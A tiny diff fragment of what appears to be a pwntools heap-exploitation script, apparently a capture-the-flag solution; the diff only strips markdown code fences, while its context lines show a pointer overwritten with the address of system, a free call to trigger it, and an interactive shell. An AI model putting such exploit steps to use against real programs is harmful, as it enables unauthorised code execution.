@@ -1,4 +1,3 @@
-```python
 from pwn import *
 import time
 
@@ -124,4 +123,4 @@ readchar(3, 8, p64(system))
 free(2)
 
 r.interactive()
-```
+
